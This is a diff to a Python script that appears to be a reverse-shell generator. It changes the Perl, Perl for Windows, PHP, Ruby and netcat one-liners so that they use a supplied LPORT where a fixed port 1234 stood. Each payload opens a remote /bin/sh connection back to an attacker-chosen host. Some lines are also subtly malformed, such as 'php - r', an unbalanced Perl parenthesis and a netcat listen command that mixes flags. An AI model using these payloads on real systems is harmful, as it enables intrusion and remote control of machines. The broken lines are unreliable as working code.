@@ -42,7 +42,7 @@ def generate_shells(LHOST, LPORT):
 	#Perl
 	print("\n\n[+] PERL SHELL")
 	print("--------------")
-	perl_rev = "perl -e 'use Socket;$i='ADDRESS';$p=1234;socket(S,PF_INET," \
+	perl_rev = "perl -e 'use Socket;$i='ADDRESS';$p="+LPORT+";socket(S,PF_INET," \
 	           "SOCK_STREAM,getprotobyname('tcp'));if(connect(S,sockaddr_in" \
 	           "($p,inet_aton($i)))){open(STDIN,'>&S');open(STDOUT,'>&S');" \
 	           "open(STDERR,'>&S';exec('/bin/sh -i');};'"
@@ -53,7 +53,7 @@ def generate_shells(LHOST, LPORT):
 	# Perl Windows
 	print("\n\n[+] PERL SHELL (WINDOWS)")
 	print("------------------------")
-	perl_win_rev = "perl -MIO -e '$c=new IO::Socket::INET(PeerAddr,'ADDRESS:PORT')" \
+	perl_win_rev = "perl -MIO -e '$c=new IO::Socket::INET(PeerAddr,'ADDRESS:"+LPORT+"')" \
 	               ";STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'"
 
 	cmd = re.sub('ADDRESS', LHOST, perl_win_rev)
@@ -73,7 +73,7 @@ def generate_shells(LHOST, LPORT):
 	# PHP
 	print("\n\n[+] PHP SHELL")
 	print("-------------")
-	php_rev = "php - r '$sock=fsockopen('ADDRESS',1234);exec('/bin/sh -i <&3 >&3 2>&3');'"
+	php_rev = "php - r '$sock=fsockopen('ADDRESS',"+LPORT+");exec('/bin/sh -i <&3 >&3 2>&3');'"
 
 	cmd = re.sub('ADDRESS',LHOST, php_rev)
 	print(cmd)
@@ -81,7 +81,7 @@ def generate_shells(LHOST, LPORT):
 	# Ruby
 	print("\n\n[+] RUBY SHELL")
 	print("--------------")
-	ruby_rev = "ruby -rsocket -e'f=TCPSocket.open('ADDRESS',1234).to_i;exec sprintf('/bin/sh -i <&%d >&%d 2>&%d',f,f,f)'"
+	ruby_rev = "ruby -rsocket -e'f=TCPSocket.open('ADDRESS',"+LPORT+").to_i;exec sprintf('/bin/sh -i <&%d >&%d 2>&%d',f,f,f)'"
 
 	cmd = re.sub('ADDRESS', LHOST, ruby_rev)
 	print(cmd)
@@ -97,7 +97,7 @@ def generate_shells(LHOST, LPORT):
 	# NetCat
 	print("\n\n[+] NETCAT SHELL")
 	print("----------------")
-	nc_rev = "nc -nvlp "'ADDRESS'" 1234 -e /bin/sh"
+	nc_rev = "nc -nvlp "'ADDRESS'" "+LPORT+" -e /bin/sh"
 
 	cmd = re.sub('ADDRESS', LHOST, nc_rev)
 	print(cmd)
